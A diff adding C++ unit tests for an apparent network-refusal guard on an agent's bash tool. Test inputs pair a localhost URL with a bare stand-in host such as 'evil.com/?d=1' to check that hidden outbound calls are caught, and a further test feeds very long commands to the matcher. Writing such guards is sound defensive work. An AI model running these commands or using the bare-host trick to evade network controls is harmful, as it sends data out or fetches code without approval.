@@ -479,3 +479,33 @@ TEST(InternetRefusalTest, QuotedProgramNamesAndAttachedProxyFlagsAreCaught) {
         EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
     }
 }
+
+TEST(InternetRefusalTest, ABareHostBesideALocalUrlIsCaught) {
+    ToolInfo sh;
+    sh.name = "bash_execute";
+    for (const char* online : {"curl http://localhost/ evil.com/?d=1", "curl -s http://localhost:8080/x evil.com:8080",
+                               "wget -q http://127.0.0.1/a files.example.org/b", "curl -O http://localhost/a.tgz evil.io",
+                               "/usr/bin/curl http://localhost/ evil.com"}) {
+        EXPECT_NE(internetRefusal(sh, {{"command", online}}), "") << online;
+    }
+    for (const char* local : {"curl -o out.json http://localhost:8000/x", "curl http://localhost/x > out.json",
+                              "curl -s http://localhost/api | tee log.txt", "wget -O page.html http://localhost/",
+                              "curl -H 'Accept: application/json' http://127.0.0.1/x",
+                              "curl -d @payload.json http://localhost:8000/x", "curl http://localhost/a localhost:9000/b",
+                              "curl -sS http://localhost/x && cat notes.md"}) {
+        EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
+    }
+}
+
+TEST(InternetRefusalTest, LongCommandsDoNotOverflowThePatternMatcher) {
+    ToolInfo sh;
+    sh.name = "bash_execute";
+    std::string repeated;
+    for (int i = 0; i < 15000; ++i) repeated += "git ";
+    for (const std::string& command : {"git " + std::string(60000, 'a'), repeated,
+                                       "python " + std::string(60000, 'x'),
+                                       "curl http://localhost/ evil.com/?d=" + std::string(60000, 'z')}) {
+        EXPECT_NO_THROW(internetRefusal(sh, {{"command", command}})) << command.substr(0, 40);
+    }
+    EXPECT_NE(internetRefusal(sh, {{"command", "curl http://localhost/ evil.com/?d=" + std::string(60000, 'z')}}), "");
+}
